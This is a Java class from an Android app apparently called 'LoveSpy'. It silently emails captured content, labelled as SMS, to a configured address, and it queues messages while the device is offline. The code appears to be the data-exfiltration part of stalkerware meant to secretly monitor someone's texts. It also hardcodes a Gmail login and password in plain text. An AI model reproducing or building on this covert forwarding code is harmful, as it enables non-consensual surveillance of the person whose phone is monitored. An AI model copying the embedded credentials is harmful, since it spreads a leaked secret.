package com.example.lovespy.app.email;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

import com.example.lovespy.app.network.NetworkStatus;
import com.example.lovespy.app.network.NetworkUpdateReceiver;
import com.example.lovespy.app.settings.SettingsActivity;
import com.example.lovespy.app.utils.Utils;

import java.util.ArrayList;

public class EmailHelper {

    public static final ArrayList<String> SUSPENDED_LIST = new ArrayList<String>();
    private Context mContext;

    public EmailHelper(Context context) {
        mContext = context;
    }

    public boolean sendEmailSilently(String letter) {
        boolean result = false;
        EmailSending emailSending = new EmailSending("lovespyservice@gmail.com", "samsungforever");
        String[] toArr = { getAddressee() };
        emailSending.setTo(toArr);
        emailSending.setFrom("wooo@wooo.com");
        emailSending.setSubject("[Sms] LoveSpy Agent");
        try {
            result = emailSending.sendSilently(letter);
        } catch(Exception e) {
            Log.e(Utils.TAG, "Could not send email", e);
        }
        return result;
    }

    public void trySending(String letter) {
        if (NetworkStatus.getInstance(mContext).isOnline()) {
            sendEmailSilently(letter);
        } else {
            SUSPENDED_LIST.add(letter);
            NetworkUpdateReceiver.setLetterList(SUSPENDED_LIST);
        }
    }

    public String getAddressee() {
        SharedPreferences sharedPref = PreferenceManager.getDefaultSharedPreferences(mContext);
        return sharedPref.getString(SettingsActivity.KEY_PREF_ADDRESSEE, "");
    }
}
